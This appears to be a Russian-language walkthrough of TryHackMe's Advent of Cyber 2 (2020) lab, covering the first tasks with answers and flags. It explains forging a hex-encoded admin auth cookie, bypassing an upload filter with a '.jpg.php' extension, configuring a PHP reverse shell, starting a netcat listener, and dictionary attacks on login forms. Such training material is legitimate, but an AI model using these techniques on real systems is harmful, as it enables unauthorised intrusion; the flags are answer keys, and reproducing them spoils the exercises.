

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Advent of Cyber 2 [2020]](https://tryhackme.com/r/room/adventofcyber2) 

Всего 30 заданий:
## Задание 1
Добро пожаловать в Advent of Cyber ​​2020

Начните изучать кибербезопасность за 25 дней, изучив основы и выполняя новые упражнения по безопасности для новичков 
каждый день вплоть до Рождества; рождественский календарь, но с заданиями по безопасности и без шоколада. 

### Призы и сертификаты
У нас есть призы на сумму более 13 000 долларов! В этом событии очки не имеют значения, а вот количество вопросов, 
на которые вы ответили, имеет значение. За каждое правильное задание вы получаете лотерейный билет, а 26 декабря мы 
случайным образом выберем победителей, используя лотерейные билеты всех участников; чем больше вопросов вы ответите, 
тем больше у вас шансов на победу. Вот призы, которые можно выиграть:   
- 5 курсов PWK + 30-дневный доступ к лаборатории + сертификация по экзамену OSCP (4995 долл. США)
- 3 пропуска INE Cyber Security (6000 долл. США)
- 20 ваучеров Proving Grounds (380 долл. США)
- 15 подписок TryHackMe (150 долл. США) Курс
- Attacking Windows AD Throwback (120 долл. США)
- Raspberry Pi 400 (122 долл. США)
- Кабель HAK5 O.MG (120 долл. США)
- 3x ваучера на практику Security+ CertMaster ($600)
- 2x ваучера на сертификацию Security+ ($560)
- 2x ваучера TryHackMe Swag номиналом $30 ($60)
- HAK5 Wifi Pineapple ($100)
- HAK5 Rubber Ducky ($50)
- HAK5 Packet Squirrel ($60)
- HAK5 LAN Turtle ($60)

Общая стоимость призового фонда:  $13,377

Кроме того, каждый день, когда вы выполняете задание, вы участвуете в другом розыгрыше призов, чтобы получить шанс 
выиграть мини-приз. «Ежедневные призы» разыгрываются в конце недели.  Выполните все задания в событии и получите 
сертификат о завершении! Убедитесь, что ваше имя указано в настройках.  

Посмотреть образец сертификата

Наши спонсоры
В преддверии Рождества мы собрали вместе несколько крупнейших имен в сфере кибербезопасности и очень рады, что они 
поддерживают мероприятие, предоставляя призы! 

CompTIA — это глобальная некоммерческая ассоциация ИТ-торговли и создатель нейтральных ИТ-сертификаций. Сертификации 
CompTIA разрабатываются при поддержке ведущих технологических компаний и проверяются отраслевыми экспертами по всему 
миру.  


Offensive Security предлагает определяющее отрасль обучение информационной безопасности. В дополнение к курсам и 
сертификациям студенты могут получить практическую практику пентестинга в наших лабораториях Proving Grounds. 
Повышайте уровень своих навыков и изучайте мышление Try Harder с командой, стоящей за Kali Linux и сертификацией 
OSCP.   


INE — ведущий поставщик технического обучения для ИТ-индустрии в областях кибербезопасности, сетей, облачных 
технологий и науки о данных. Наша миссия — быть ведущим мировым поставщиком практического, ролевого технического 
обучения, маниакально нацеленного на развитие экспертов.  

Специальные авторы
Все задачи в этой комнате были заказаны и выполнены нашим замечательным сообществом, однако у нас есть четыре широко 
известных специальных участника. 

DarkStar7471
Джон Хэммонд
Кибер-наставник
Тиб3риус

### Ответить на вопросы ниже
Ознакомьтесь со спонсорами и специальными авторами. 

```commandline
Ответ не нужен
```

## Задание 2
Станьте частью нашего сообщества и присоединяйтесь к нашему  Discord !
Подпишитесь на нас в  Twitter  , чтобы получать ежедневные сообщения с заданиями.
Присоединяйтесь к нашему растущему   сабреддиту !

Мы будем выбирать случайного победителя каждый день, чтобы принять участие, просто выполните задание, выпущенное в 
этот день. Все победители будут объявлены в Twitter на выходных!  Хотите поделиться событием, не стесняйтесь 
использовать графику ниже!  



https://tryhackme.com/christmas

### Ответить на вопросы ниже
Присоединяйтесь к нашему Discord и поздоровайтесь!
```commandline
Ответ не нужен
```
Следуйте за нами на Twitter!
```commandline
Ответ не нужен
```
Загляните на сабреддит!
```commandline
Ответ не нужен
```

## Задание 3
Краткое руководство

Для доступа к целевым машинам, которые вы разворачиваете на TryHackMe, вам нужно будет либо использовать клиент 
OpenVPN, либо развернуть собственный веб-ориентированный AttackBox ( вы можете сделать это, нажав синюю кнопку 
«Запустить AttackBox» в верхней части этой страницы ).  Мы настоятельно рекомендуем вам пройти обучающую  комнату, 
чтобы узнать больше о подключении.   

Используя веб-ориентированный AttackBox, вы можете выполнить все эти упражнения через браузер. Если вы постоянный 
пользователь, вы можете развернуть AttackBox бесплатно на 1 час в день, если вы подписаны, вы можете развернуть его 
на неограниченное количество времени!   

### Правила
Нарушение любого из следующих правил приведет к исключению из соревнования.
- *.tryhackme.com и сервер OpenVPN недоступны для зондирования, сканирования или эксплуатации.
- Пользователям разрешено взламывать только те машины, которые установлены в комнатах, к которым у них есть доступ.
- Пользователи не должны нападать на других пользователей или преследовать их.
- Пользователи должны войти в мероприятие только один раз, используя одну учетную запись.

Ответы на вопросы не подлежат разглашению.
### Ответить на вопросы ниже
Потренируйтесь подключаться к нашей сети!
```commandline
Ответ не нужен
```

## Задание 4
Событие Advent of Cyber полностью бесплатное! Однако ознакомьтесь с некоторыми причинами подписаться: 

Если вы хотите подарить VIP-подписку TryHackMe, вы можете приобрести ваучеры .

### Ответить на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 5
[Рождественская история]
Задания используют эту историю

После прошлогодних проделок, когда Эльф МакЭлферсон и Эльф МакСкиди весь декабрь находились в режиме контроля 
повреждений, МакСкиди поклялся никогда больше этого не допустить. Предыдущий рождественский период был чрезвычайно 
напряженным, поскольку Рождественский Монстр умудрился скомпрометировать каждую систему в корпоративной 
инфраструктуре Санты, чтобы помешать Рождеству наступить. В этом году Рождество все еще под угрозой?   

McSkidy показала большие перспективы в предыдущем инциденте и получила задание сформировать команду безопасности в 
компании Санты - *Лучшая фестивальная компания*. Из-за сопротивления руководства, бюджетных и бюрократических 
проблем McSkidy смогла начать формировать свою команду только с 8 ноября. С тех пор она наняла только 2 членов 
команды - одного специалиста по безопасности Эльфа МакХакера и одного стажера Эльфа МакИгера.   

Вечер 30 ноября — команда McSkidy усердно работала над предотвращением любых простоев и инцидентов безопасности во 
всей сети и стеке приложений Best Festival Company. McHacker предложил установить VPN и разрешить доступ к 
инфраструктуре только через VPN . После долгой 8-часовой установки и развертывания McSkidy открывает свою панель 
мониторинга и замечает, что трафик не поступает ни в одно из приложений (это было ожидаемо, поскольку ни у кого не 
было доступа к VPN ) . *Слава богу*, сказала она. *Опять взломать — это не вариант.*    

*ЗВОН, ЗВОН, ЗВОН* - ее горячая линия Elf начинает звонить, и она подпрыгивает. *Расписание Санты не работает - Я 
НИЧЕГО НЕ ВИЖУ,* кричит Elf McAssistant. В течение нескольких секунд поступают сотни телефонных звонков, и *Elf 
McSkidy чувствует то самое щемящее чувство в животе.* Она быстро отправляет *McHacker* проанализировать журналы VPN .
Он замечает полезную нагрузку, которая напоминает обход аутентификации VPN , который позволяет любому обойти VPN - 
*кто-то установил неправильную версию?* Из-за плохого состояния безопасности во всей сети этот неизвестный 
злоумышленник сумел получить доступ ко всем приложениям и их базовым серверам!     

В отличие от прошлого раза, никто не взял на себя ответственность за этот инцидент. *Вот и снова*, вздыхает она. 
Спасти Рождество предстоит вам (Эльфу МакИгеру) и остальным. 

Обратите внимание, что задания появляются ежедневно и будут различаться по сложности  (хотя всегда будут нацелены на 
начальный уровень). 

### Ответить на вопросы ниже
В некоторых заданиях используется рождественская история, поэтому обязательно прочтите вышеизложенное.
```commandline
Ответ не нужен
```
## Задание 6
«Новый сервер OpenVPN компании Best Festival Company был взломан. Это кризис!

Злоумышленник повредил различные аспекты инфраструктуры компании, в том числе использовал Центр управления 
Рождеством, чтобы отключить сборочную линию! 

До Рождества осталось всего 24 дня, и эта линия должна быть запущена, иначе не будет никаких подарков! Вам нужно 
взломать аккаунт Санты (черт побери этого хакера, который меняет пароль!) и снова запустить сборочную линию, иначе 
Рождество будет испорчено!»  

*После того, как вы дадите задание, МакСкиди вручает вам следующее досье с важной информацией для задания. Перед тем,
как прочитать его, вы нажимаете большую зеленую кнопку «Deploy» , чтобы запустить Control Centre, а также кнопку 
«Start AttackBox» в верхней части страницы *  

Посмотрите видео Джона Хэммонда о решении этой задачи!
Досье составлено @MuirlandOracle


### Паутина :
Интернет — это одна из тех вещей, которыми все пользуются, но мало кто удосуживается узнать о ней. Как хакерам, нам 
жизненно важно понимать, что такое веб и как он работает. 


Когда вы открываете свой веб-браузер и переходите на веб-сайт, это кажется таким простым, но что на самом деле 
происходит за кулисами? Прежде 
всего, ваш компьютер связывается с известным сервером DNS ( система доменных имен ) , чтобы узнать, где в Интернете 
можно найти веб-сайт. Затем сервер DNS возвращает IP-адрес удаленного сервера. Его можно использовать для прямого 
перехода на веб-сайт. Вы можете представить себе Интернет как нечто вроде самой планеты — у нас есть множество мест 
по всему миру. У всех этих мест есть почтовый адрес — это похоже на доменное имя веб-сайта (например, tryhackme.com 
или google.com); но у них также есть координаты, которые можно использовать для определения их местоположения с 
абсолютной точностью. Эти координаты подобны IP-адресу веб-сайта. Если вы знаете почтовый адрес места, вы можете 
ввести его в Google Maps и получить точные координаты, которые затем можно ввести в навигатор, чтобы он привел вас 
туда с высокой точностью! Точно так же ваш браузер получает адрес веб-сайта (например, tryhackme.com). Он отправляет 
этот адрес на DNS-сервер, который сообщает ему «координаты» (IP-адрес) сайта. Ваш компьютер не понимает исходное, 
понятное человеку доменное имя, но он понимает , что такое IP-адрес! Затем IP можно использовать для поиска сервера 
в Интернете, что позволит вашему компьютеру запрашивать содержимое веб-сайта. Конечно, на самом деле это сильно 
упрощенная аналогия, поэтому более подробное объяснение этого процесса можно найти здесь .            



### HTTP (S) :
Как только ваш компьютер узнает , где он может найти целевой веб-сайт, он отправляет на веб-сервер так называемый 
HTTP- запрос ( протокол гипертекстовой передачи ).
Это просто стандартный сетевой запрос, но он отформатирован таким образом, что его могут понять и ваш веб-браузер, и 
сервер. На практике это означает добавление определенных «заголовков» к запросу, которые идентифицируют его как 
HTTP- запрос и сообщают серверу множество другой информации о запросе, а также о вашем собственном браузере. Среди 
многих других заголовков HTTP- запросы всегда имеют метод и цель. Они указывают, что нужно получить с сервера (цель)
и как это получить (метод). Метод, наиболее часто используемый для получения информации, называется методом GET. При 
отправке данных на сервер чаще всего используется метод POST.     

Более подробную информацию о HTTP-запросах, методах и заголовках можно найти в разделе «Основы веб-технологий» !

После того , как содержимое получено с сервера, ваш браузер считывает полученный код и отображает его как 
веб-страницу. Обычно это означает взятие макета страницы из документа HTML (язык гипертекстовой разметки) , 
стилизацию его с помощью подключенного файла CSS (каскадные таблицы стилей) , а затем добавление любого 
динамического содержимого с помощью одного или нескольких подключенных файлов Javascript.    

HTTP имеет один неотъемлемый недостаток: а именно, он небезопасен. Любой может видеть, что вы запрашиваете, и что 
отправляется вам обратно. По этой причине был изобретен HTTPS (H yper t ext Transfer Protocol S ecure). Он 
работает точно так же, как и стандартный HTTP, но обеспечивает зашифрованное соединение (функциональность которого 
выходит за рамки этого досье)   


### Печенье :
HTTP — это изначально не сохраняющий состояние протокол. Это означает, что никакие данные не сохраняются между 
соединениями; ваш компьютер может сделать два запроса сразу друг за другом, и, не полагаясь на отдельное программное 
обеспечение, веб-сервер не сможет узнать, что это вы сделали оба запроса. Это наводит на важный вопрос: если HTTP не 
сохраняет состояние, то как работают системы входа? Веб-сервер должен иметь способ определить, что у вас есть нужный 
уровень доступа, и он вряд ли может попросить вас ввести пароль каждый раз, когда вы запрашиваете новую страницу!    

Ответ — файлы cookie — крошечные фрагменты информации, которые хранятся на вашем компьютере и отправляются на сервер 
вместе с каждым сделанным вами запросом. Файлы cookie аутентификации (или сеанса) используются для вашей 
идентификации (они будут очень важны в вашей сегодняшней миссии!). Сервер получает ваш запрос с прикрепленным файлом 
cookie и проверяет файл cookie, чтобы узнать, какой уровень доступа вам разрешен. Затем он возвращает ответ, 
соответствующий этому уровню доступа.    


Например, обычный пользователь должен иметь возможность видеть (но не взаимодействовать) нашу панель управления; но 
Санта должен иметь доступ ко всему! Файлы cookie также часто используются для других целей, таких как реклама и 
хранение пользовательских настроек (например, светлая/темная тема); однако, это не будет важно для вашей сегодняшней 
задачи. Любой сайт может устанавливать файлы cookie с различными свойствами — наиболее важными из них для 
сегодняшней задачи являются имя и значение файлов cookie, оба из которых всегда будут установлены. Стоит отметить, 
что сайт может получать доступ только к файлам cookie, связанным с его собственным доменом (т. е. google.com не 
может получить доступ к файлам cookie, хранящимся tryhackme.com, и наоборот).      



Важно отметить, что файлы cookie хранятся локально на вашем компьютере. Это означает, что они находятся под вашим 
контролем — т. е. вы можете добавлять, редактировать или удалять их по своему усмотрению. Есть несколько способов 
сделать это, однако чаще всего это делается с помощью инструментов разработчика браузера, доступ к которым можно 
получить в большинстве браузеров, нажав F12, или Ctrl + Shift + I. Открыв инструменты разработчика, перейдите на 
Storageвкладку в FireFox или Applicationвкладку в Chrome/Edge и выберите Cookiesменю в левой части консоли.    

На изображении выше вы можете увидеть тестовый файл cookie для веб-сайта. Показаны важные атрибуты «Имя» и 
«Значение». Имя файла cookie используется для его идентификации на сервере. Значение файла cookie — это данные, 
хранящиеся на сервере. В этом примере сервер будет искать файл cookie с именем «Имя файла cookie». Затем он извлечет 
значение «CookieValue» из этого файла cookie.   

Эти значения можно редактировать, дважды щелкнув по ним, что очень удобно, если вы можете редактировать сеансовый 
или авторизационный cookie-файл, поскольку это может привести к повышению привилегий, если у вас есть доступ к 
авторизационным cookie-файлам администратора.  

Прочитав длинное досье, вы готовы снова взломать Центр управления Рождеством Санты! Вы вводите IP-адрес в верхней 
части экрана в строку поиска браузера и нажимаете Enter, чтобы загрузить страницу. 

Примечание: Помните, что полная загрузка компьютера может занять до пяти минут!

### Ответить на вопросы ниже
Разверните AttackBox (синяя кнопка "Start AttackBox") и машину задач (зеленая кнопка на этой задаче), если вы еще 
этого не сделали. После того, как оба развернуты, откройте FireFox на AttackBox и скопируйте/вставьте IP-адрес 
машины в строку поиска браузера.  
```commandline
Ответ не нужен
```
Зарегистрируйте учетную запись, а затем войдите в систему.

Как называется файл cookie, используемый для аутентификации?
```commandline
auth
```
В каком формате закодировано значение этого cookie-файла?
```commandline
Hexadecimal
```
В каком формате хранятся данные после расшифровки cookie?
```commandline
JSON
```
Придумайте, как обойти аутентификацию.

Какова ценность печенья Санты?
```commandline
7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d
```
Теперь, когда вы стали пользователем Санты, вы можете снова активировать сборочную линию!
Какой флаг вы получаете, когда линия полностью активна?
```commandline
THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}
```

## Задание 7
После вчерашних героических подвигов, когда вы вернули себе контроль над центром управления, эльф МакСкиди решил 
поручить вам важное задание.

«Мы знаем, что нас взломали, поэтому нам нужен способ защитить себя! Команда разработчиков создала веб-сайт, на 
который эльфы могут загружать фотографии подозрительных людей, ошивающихся на фабрике, но нам нужно убедиться, что 
он безопасен, прежде чем мы добавим его в публичную сеть. Пожалуйста, проведите аудит безопасности на новом сервере 
и убедитесь, что его невозможно взломать!»

Вы слушаете инструктаж и принимаете задачу, одновременно нажимая кнопку развертывания, чтобы запустить сервер.

МакСкиди снова дает вам досье с полезной информацией, которая поможет вам в вашей задаче, и вы читаете ее, ожидая 
загрузки сервера: 

Посмотрите видео DarkStar о решении этой задачи!
Досье составлено @MuirlandOracle


### Параметры GET и URL-адреса
Мы кратко рассмотрели различия между запросами GET и POST в предыдущем досье; однако акцент был сделан на запросах 
POST, используемых в форме входа. Сервер, который вы будете тестировать сегодня, использует концепцию, называемую 
«параметрами GET». Так же, как запросы POST могут использоваться для отправки информации на сервер, так же могут 
использоваться и запросы GET; однако есть одно важное отличие. В запросах POST отправляемые данные включаются в 
«тело» запроса. В запросах GET данные включаются в URL в качестве «параметра». Лучше всего это продемонстрировать на 
примере:     

https://www.thebestfestivalcompany.xyz/index.php?snack=mincePie

( Обратите внимание : этот сайт полностью вымышленный. Он не существует, и подключение к нему не является частью задачи)

Этот URL состоит из 7 различных частей. Давайте рассмотрим каждую из них по очереди:
- Сначала у нас есть протокол ( https://). Он определяет, должен ли запрос быть сделан с использованием HTTP или 
HTTPS. В нашем примере мы используем HTTPS.
- Далее у нас есть поддомен ( www). Традиционно это "www" ( W orld W ide W eb), чтобы обозначить, что целью является 
  веб-сайт; однако это не обязательно. На самом деле, поддомены могут быть, по сути, чем угодно; например, многие 
  веб-сайты используют такие вещи, как " assets" или " api", чтобы обозначить различные поддомены с различным 
  использованием. (например https://api.thebestfestivalcompany.xyz)  
- Следующая часть URL — домен ( thebestfestivalcompany). Домены должны быть зарегистрированы и используются как 
  ссылки между запоминающимся словом или фразой и IP-адресом. Другими словами, они используются для того, чтобы дать 
  имя серверу , на котором запущен веб-сайт. 
- Далее у нас есть TLD ( T op Level D omain ) — .xyzдля нашего примера. Домены верхнего уровня используются DNS для 
  определения того, где искать, если они хотят найти ваш домен. Раньше домены верхнего уровня имели определенное 
  применение (и многие до сих пор имеют!), но в наши дни это не всегда так. Например, .co.uk  указывает на компанию, 
  базирующуюся в Великобритании, .comуказывает на компанию, базирующуюся в США.  
- Затем у нас есть ресурс , который мы выбираем, — в данном случае это домашняя страница веб-сайта: index.php. В 
  качестве примечания, все домашние страницы должны называться "index", чтобы быть правильно обслуживаемыми 
  веб-сервером без необходимости указывать их полностью, если только этот параметр не был изменен со значения по 
  умолчанию в конфигурации веб-сервера. Вот как вы можете перейти на , https://tryhackme.comне указывая, что вы 
  хотите получить домашнюю страницу — страница index обслуживается автоматически, потому что вы не указали!    
- Последние два аспекта URL-адреса наиболее важны для нашей текущей темы: они оба относятся к параметрам GET. Сначала 
  у нас есть ?snack=. Здесь ?используется для указания того, что ожидается параметр GET. Затем у нас есть имя 
  параметра: snack. Оно используется для идентификации параметра на сервере. Затем у нас есть знак равенства ( =), 
  указывающий, что значение будет следующим.  
- Наконец, у нас есть значение параметра GET: mincePie, ведь кто не любит пирожки с начинкой, верно?
Важно отметить, какая именно часть URL является параметром GET. В частности, мы говорим о ?snack=mincePie. Если бы 
было больше одного параметра, мы бы разделили их амперсандом ( &). Например: ?snack=mincePie&drink=hotChocolate. 
Таким образом, мы можем отправить на сервер несколько значений, различающихся ключами (например, "mincePie" 
идентифицируется ключом: "snack").   


### Загрузка файлов
В современном Интернете существует бесчисленное множество способов использования загрузки файлов — фотографии 
профиля, школьные/университетские заявки, диаграммы, фотографии вашей собаки, как хотите! Хотя загрузка файлов очень 
распространена, ее также очень легко реализовать небезопасным способом. По этой причине важно понимать серьезность 
вектора атаки.   

Когда у вас есть возможность загружать файлы на сервер, у вас есть прямой путь к RCE ( Remote C ommand E xecution). 
Форма загрузки без ограничений будет означать , что вы можете загрузить скрипт, который при выполнении подключается 
обратно к вашей атакующей машине и дает вам возможность выполнить любую команду, которую вы хотите. Было бы очень 
необычно найти загрузку файла без фильтрации ; но гораздо реже можно найти загрузку файла, которая использует 
несовершенные методы фильтрации, которые можно обойти, чтобы загрузить вредоносный скрипт. Скрипт должен быть 
написан на языке, который может выполнить сервер. PHP обычно является хорошим выбором для этого, так как большинство 
веб-сайтов по-прежнему написаны с использованием PHP back-end.      

В этой задаче нет времени рассматривать каждый вид обхода фильтра ( на эту тему есть буквально целая комната, 
которая рекомендуется для дальнейшей практики). Вместо этого мы просто рассмотрим один из самых распространенных 
типов фильтра и его обход:  

Фильтрация расширений файлов: как следует из названия, фильтрация расширений проверяет расширение загружаемых файлов.
Часто это делается путем указания списка разрешенных расширений, а затем проверки загружаемого файла по списку. Если 
расширение не находится в разрешенном списке, загрузка отклоняется.  
Итак, в чем обход? Что ж, ответ в том, что это полностью зависит от того, как реализован фильтр. Многие фильтры 
расширений разделяют имя файла по точке ( .) и проверяют, что идет после нее, по списку. Это делает очень простым 
обход, загрузив двуствольное расширение (например .jpg.php). Фильтр разделяет по точке(ам), затем проверяет, что, по 
его мнению, является расширением по списку. Если jpg является разрешенным расширением, то загрузка будет успешной, и 
наш вредоносный PHP- скрипт будет загружен на сервер.    
При внедрении системы загрузки хорошей практикой является загрузка файлов в каталог, к которому невозможно получить 
удаленный доступ. К сожалению, часто это не так, и скрипты загружаются в подкаталог на веб-сервере (часто что-то 
вроде /uploads, /images, /media, или /resources). Например, мы могли бы найти загруженный скрипт в https://www.
thebestfestivalcompany.xyz/images/shell.jpg.php.   


### Обратные оболочки
Предположим, что мы нашли место для загрузки нашего вредоносного скрипта и обошли фильтр — что тогда? Есть несколько 
путей, которые мы можем использовать: наиболее распространенный из которых — загрузка обратного шелла . Это скрипт, 
который создает сетевое соединение с сервера на нашу атакующую машину. Большинство веб-серверов написаны на PHP back 
end, что означает, что нам нужен PHP reverse shell script — так уж получилось, что он уже есть на Kali/AttackBox по 
адресу  /usr/share/webshells/php/php-reverse-shell.php(Примечание: если вы не используете Kali или предоставленный 
AttackBox, тот же скрипт можно найти здесь .     

Скопируйте веб-оболочку в текущий каталог ( cp /usr/share/webshells/php/php-reverse-shell.php .), затем откройте ее 
в текстовом редакторе по вашему выбору. 
Прокрутите вниз до тех пор, пока не увидите $ipи $port(оба отмечены // CHANGE THIS). Установите IP на свой IP-адрес 
TryHackMe (который можно найти в зеленом пузыре на панели навигации, если вы используете AttackBox, или запустив , 
ip a show tun0если вы используете собственную виртуальную машину Linux с пакетом подключений OpenVPN) — не забудьте 
сохранить двойные кавычки. Установите порт  без двойных кавычек, затем сохраните и выйдите из файла. Поздравляем, 
теперь у вас есть полностью настроенный PHP- скрипт обратной оболочки!443    





Обратные оболочки PHP можно очень легко активировать, если сохранить их в доступном месте: просто перейдите к файлу 
в браузере, чтобы выполнить скрипт (и отправить обратную оболочку): 



На схеме мы сначала загружаем нашу оболочку. Затем мы переходим к ней в нашем браузере, заставляя сервер отправить 
обратную оболочку обратно нашему ожидающему слушателю. 
Для более глубокого объяснения обратных оболочек посетите комнату Введение в оболочки .


Обратные прослушиватели оболочки

Мы долго говорили о слушателях обратного шелла, но что они из себя представляют? Короче говоря, слушатель обратного 
шелла используется для открытия сетевого сокета для получения необработанного соединения — например, созданного при 
выполнении обратного шелла! Простейшая форма слушателя создается с помощью программы netcat , которая установлена 
как в Kali, так и в AttackBox по умолчанию. Мы можем создать слушателя для загруженного обратного шелла, используя 
эту команду: sudo nc -lvnp 443. По сути, это создает слушателя на порту 443. В реальной среде вам нужно будет 
использовать общий порт, такой как 443, который не фильтруется брандмауэрами в большинстве сценариев, что 
увеличивает вероятность того, что наш обратный шелл подключится обратно. После настройки netcat наш обратный шелл 
сможет подключиться обратно к нему при активации.       

Если вам интересно, полное объяснение можно найти в разделе «Введение в ракушки», ссылка на который приведена выше.


### Собираем все вместе
Это был большой объем информации, поэтому давайте соберем ее воедино и рассмотрим полный процесс эксплуатации 
уязвимости загрузки файлов в веб-приложении PHP : 
- Найдите точку загрузки файла.
- Попробуйте загрузить несколько невинных файлов — что он принимает? (Изображения, текстовые файлы, PDF-файлы и т. д.)
- Найдите каталог, содержащий ваши загрузки.
- Попробуйте обойти все фильтры и загрузить обратный шелл.
- Запустите прослушиватель netcat для получения оболочки
- Перейдите в оболочку в вашем браузере и получите соединение!
В нижней части досье находится липкая записка со следующим сообщением:

Для Elf McEager:
Вам был присвоен идентификационный номер для аудита системы: ODIzODI5MTNiYmYw. Используйте его, чтобы получить 
доступ к разделу загрузки на сайте. 
Удачи!

Запишите идентификационный номер и перейдите по отображенному IP-адресу (MACHINE_IP) в своем браузере .

### Ответить на вопросы ниже
Какую строку текста необходимо добавить в URL-адрес, чтобы получить доступ к странице загрузки?

?id=ODIzODI5MTNiYmYw
```commandline
Ответ не нужен
```
Какие типы файлов принимает сайт?

Image
```commandline
Ответ не нужен
```
Обойдите фильтр и загрузите обратный шелл.

В каком каталоге хранятся загруженные файлы?

/uploads/
```commandline
Ответ не нужен
```
Активируйте обратную оболочку и перехватите ее в прослушивателе netcat!
```commandline
Ответ не нужен
```
Какой флаг /var/www/flag.txt?

THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
```commandline
Ответ не нужен
```

## Задание 8
МакСкиди идет по коридору и слышит слабый писк, Бип... Бип... Бип... по мере того, как МакСкиди приближается к 
комнате инженеров саней, слабый писк становится все громче и громче... БИП... БИП... Что-то явно не так! МакСкиди 
вбегает в комнату, хлопает дверью и видит, как панель управления санями Санты загорается красными сообщениями об 
ошибках! "Сани Санты! Их взломали, код красный... код красный!" - кричит он, бегом обратно в командный центр 
эльфийской безопасности.    

Сможете ли вы помочь Макскиди и его команде взломать сани Санты и вернуть себе контроль?

Посмотрите видео DarkStar о решении этой задачи!
### Цели обучения
- Понимание аутентификации
- Разберитесь в использовании учетных данных по умолчанию и в чем их опасность
- Обход формы входа с помощью BurpSuite
### Аутентификация
Аутентификация — это процесс проверки личности пользователя, обычно с помощью учетных данных (таких как имя 
пользователя, идентификатор пользователя или пароль); проще говоря, аутентификация подразумевает проверку того, что 
кто-то действительно является тем, за кого себя выдает. Авторизация (которая принципиально отличается от 
аутентификации, но часто используется как взаимозаменяемое понятие) определяет, к чему пользователь может и к чему 
не может получить доступ; авторизация рассматривается в завтрашнем пошаговом руководстве, сегодняшняя задача 
фокусируется на аутентификации и некоторых распространенных недостатках.     


### Учетные данные по умолчанию
Вероятно, вы приобрели (или загрузили сервис/программу), которая предоставляет вам набор учетных данных в начале и 
требует изменить пароль после его настройки (обычно эти учетные данные, которые предоставляются в начале, одинаковы 
для каждого устройства/каждой копии программного обеспечения). Проблема в том, что если их не менять, злоумышленник 
может найти (или даже угадать) учетные данные.

Что еще хуже, эти устройства часто подвергаются воздействию Интернета, что потенциально позволяет любому человеку 
получить к ним доступ и управлять ими. В 2018 году сообщалось, что ботнет (несколько подключенных к Интернету 
устройств, контролируемых злоумышленником для выполнения DDoS-атак) под названием Mirai использовал устройства 
Интернета вещей ( IoT ) для удаленного входа в систему , настраивая устройство для выполнения вредоносных атак под 
контролем злоумышленников; ботнет Mirai заразил более 600 000 устройств IoT, в основном путем сканирования Интернета 
и использования учетных данных по умолчанию для получения доступа.

Фактически, такие компании, как Starbucks и Министерство обороны США, стали жертвами того, что оставили свои сервисы 
работающими с учетными данными по умолчанию, а охотники за ошибками были вознаграждены за ответственное сообщение об 
этих очень простых проблемах (Starbucks заплатила 250 долларов за сообщенную проблему):  

https://hackerone.com/reports/195163 - Starbucks, вознаграждение за баг-баунти для учетных данных по умолчанию.
https://hackerone.com/reports/804548 - Министерство обороны США, доступ администратора с использованием учетных 
данных по умолчанию. 
В 2017 году сообщалось, что 15% всех устройств Интернета вещей по-прежнему используют пароли по умолчанию.

SecLists — это набор общих списков, включающих имена пользователей, пароли, URL-адреса и многое другое. Список 
паролей, известный как «rockyou.txt», обычно используется в задачах безопасности и определенно должен быть частью 
вашего набора инструментов безопасности.  


### Атаки по словарю с использованием BurpSuite
Атака по словарю — это метод взлома аутентифицированной системы путем перебора списка учетных данных. Если у вас 
есть список имен пользователей и паролей по умолчанию (или наиболее распространенных), вы можете перебрать каждый из 
них в надежде, что одна из комбинаций окажется успешной.  

Вы можете использовать ряд инструментов для выполнения атаки по словарю, одним из самых известных является Hydra 
(быстрый взломщик входа в сеть) и BurpSuite, стандартный инструмент для тестирования на проникновение веб-приложений.
Учитывая, что день 3 посвящен веб-эксплуатации, мы покажем вам, как использовать BurpSuite для выполнения атаки по 
словарю на веб-форму входа.   

Чтобы загрузить BurpSuite, нажмите здесь , в противном случае BurpSuite предустановлен на нашем веб-ориентированном 
AttackBox. 

Запустите BurpSuite. Это можно сделать на AttackBox, щелкнув логотип BurpSuite на панели значков.

Используйте полученные знания, чтобы помочь МакСкиди взломать систему отслеживания саней Санты!

### Ответить на вопросы ниже
Разверните AttackBox (синяя кнопка "Start AttackBox") и машину задач (зеленая кнопка на этой задаче), если вы еще 
этого не сделали. После того, как оба развернуты, откройте Firefox на AttackBox и скопируйте/вставьте IP машины 
(MACHINE_IP) в строку поиска браузера.  
```commandline
Ответ не нужен
```
Используйте BurpSuite для взлома формы входа. Используйте следующие списки для учетных данных по умолчанию:
Используйте правильные учетные данные для входа в приложение Santa Sleigh Tracker. Не забудьте отключить Foxyproxy 
после того, как BurpSuite завершит атаку! 

Что такое флаг?
```commandline
THM{885ffab980e049847516f9d8fe99ad1a}
```

## Задание 9
Посмотрите видео DarkStar о решении этой задачи!
Введение и история:
Мы рассмотрим некоторые из основных инструментов, используемых при тестировании веб-приложений. Вы узнаете, как 
использовать Gobuster для перечисления веб-сервера на предмет скрытых файлов и папок, чтобы помочь в восстановлении 
форумов Elf. Позже вы познакомитесь с важной техникой, которая называется фаззингом, где у вас будет возможность 
применить теорию на практике.   

Наш злобный, подлый, мерзкий, жестокий, презрительный, злой хакер испортил форумы Elf и полностью удалил страницу 
входа! Однако у нас все еще может быть доступ к API . Системный администратор также сказал нам, что API создает логи,
используя даты в формате ГГГГММДД.  

### Что такое фаззинг?
Если говорить проще, фаззинг можно назвать в некоторой степени «причудливым брутфорсом». Однако вы можете фаззингить 
то, что вы не можете брутфорсить. Фаззинг — это использование инструментов безопасности для автоматизации ввода 
данных, которые мы предоставляем, в такие вещи, как веб-сайты или программные приложения. Фаззинг — чрезвычайно 
эффективный процесс, поскольку компьютеры могут выполнять трудоемкие действия, такие как поиск скрытых файлов/папок, 
пробовать разные имена пользователей и пароли, гораздо быстрее, чем человек (и готов это делать...)    

Плохо построенные приложения часто не могут обрабатывать данные так, как им положено, при интенсивной нагрузке. 
Более того, данные, которые мы анализируем в приложении, могут быть интерпретированы и выполнены (вместо того, чтобы 
быть обработанными правильно, т. е. системными командами). Мы можем использовать фаззинг, чтобы заставить приложение 
вызвать то, что известно как состояние ошибки, когда этим может злоупотребить тестировщик на проникновение или 
охотник за ошибками.    


### Введение в использование Gobuster
Логически рассуждая, на веб-сайте есть много частей, которые среднестатистический пользователь не видит. Это может 
быть что угодно, от карты сайта до секретного каталога, содержащего важные файлы. К сожалению, это может привести к 
